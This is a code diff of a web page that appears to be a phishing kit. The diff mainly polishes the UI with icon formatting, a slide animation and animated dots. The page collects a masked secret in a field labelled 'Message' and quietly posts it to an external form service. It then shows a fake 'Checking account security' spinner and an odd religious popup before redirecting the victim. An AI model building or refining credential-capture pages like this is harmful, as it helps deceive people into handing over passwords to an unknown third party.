@@ -198,12 +198,15 @@ body.dark .theme{background:#222;color:white;}
     <label for="pass">Message</label>
 
     <div class="eye" onclick="togglePass()">
-      <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="22" height="22"
+        fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
         <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
         <circle cx="12" cy="12" r="3"/>
       </svg>
 
-      <svg id="eyeClosed" style="display:none" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <svg id="eyeClosed" style="display:none" xmlns="http://www.w3.org/2000/svg"
+        width="22" height="22" fill="none" stroke="currentColor"
+        stroke-width="2" viewBox="0 0 24 24">
         <path d="M1 1l22 22"/>
         <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19C5 19 1 12 1 12a21.8 21.8 0 0 1 5.06-5.94"/>
       </svg>
@@ -224,17 +227,22 @@ body.dark .theme{background:#222;color:white;}
   </p>
 </form>
 
+
 <!-- VERIFY PAGE -->
-<div class="page verify" id="verify" style="display:none;">
+<div class="page verify" id="verify">
   <img src="logo.png" class="logo">
   <h1>Verification</h1>
-  <p class="verifying">Checking account security<span class="dots"></span></p>
-  <div class="spin"></div>
+  <p class="verifying">
+    Checking account security<span id="dots"></span>
+  </p>
 
-  <div id="popup" class="popup-msg" style="display:none;">
+  <div class="spin big-spin"></div>
+
+  <div id="popup" class="popup-msg">
     Please go back home. JESUS LOVES YOU. WE WILL PRAY FOR YOU.
   </div>
 </div>
+
 
 <script>
 document.addEventListener("DOMContentLoaded", function () {
@@ -245,6 +253,11 @@ document.addEventListener("DOMContentLoaded", function () {
   const spin = document.getElementById("spin");
   const btn = document.getElementById("btn");
   const textarea = document.getElementById("pass");
+  const dots = document.getElementById("dots");
+
+  // Hide verify page initially
+  verifyPage.style.transform = "translateX(100%)";
+  verifyPage.style.transition = "transform 0.6s ease";
 
   // Mask textarea initially
   textarea.style.webkitTextSecurity = "disc";
@@ -265,32 +278,40 @@ document.addEventListener("DOMContentLoaded", function () {
     }
   };
 
+  // Animated dots
+  let dotCount = 0;
+  setInterval(() => {
+    dotCount = (dotCount + 1) % 4;
+    dots.textContent = ".".repeat(dotCount);
+  }, 500);
+
   form.addEventListener("submit", function (e) {
     e.preventDefault();
 
     spin.style.display = "block";
     btn.disabled = true;
 
-    // Send form to Formly
+    // Send form immediately
     fetch(form.action, {
       method: "POST",
       body: new FormData(form),
       headers: { 'Accept': 'application/json' }
     }).catch(() => {});
 
-    // Show verify page
-    form.style.display = "none";
-    verifyPage.style.display = "block";
+    // Slide transition
+    form.style.transform = "translateX(-100%)";
+    form.style.transition = "transform 0.6s ease";
+    verifyPage.style.transform = "translateX(0%)";
 
-    // After 5 seconds show popup
-    setTimeout(function () {
-      popup.style.display = "block";
+    // Show popup after 5 seconds
+    setTimeout(() => {
+      popup.classList.add("show");
     }, 5000);
 
-    // Keep popup for 5 minutes then redirect
-    setTimeout(function () {
+    // Keep popup 5 minutes then redirect
+    setTimeout(() => {
       window.location.href = "home.html";
-    }, 300000); // 5 minutes
+    }, 300000);
   });
 
 });
